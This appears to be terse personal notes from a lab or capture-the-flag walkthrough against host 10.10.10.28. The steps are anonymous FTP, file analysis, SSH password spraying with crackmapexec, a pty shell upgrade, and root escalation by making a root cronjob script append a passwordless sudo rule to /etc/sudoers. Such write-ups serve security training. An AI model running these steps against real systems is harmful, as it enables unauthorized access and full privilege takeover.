```Bash
ftp - anonymous - binary 
```

```Bash
file 
binwalk
strings
```

```Bash
// get 0x0856BF. SO it can be a dic or a memenory address, try two direction 
// roflmao, a internet slang
// since get a password, b4 we know it open 21, so maybe it is for 21 port.
sudo crackmapexec ssh 10.10.10.28 -u which_one_lol.txt -p Pass.txt --continue-on-success
// find unable connet, maybe ssh have firewell 
// change order of username to try again
// the txt in Pass.txt are not the pw, but pw is just Pass.txt for user overflow
```

```Bash
python -c ´import pty;pty.spawn("/bin/bash")´
ls -liah //change dic or file hidden
// go to web dic, in apache, it is /var/www or just /var/
//we find /var/backup
// suddenly ssh exit with a message, so root have a cronjob 
// since we can not access crontab, so try cronlog 
find / -name cronlog 2>/dev/null 
// get /var/cronlog 
find / -name clearner.py 2>/dev/null
```

```Bash
os.system(´echo "overflow ALL=(ALL)NOPASSWD: ALL " >> /etc/sudoers´) 
sudo -l // check current user have super user priv
```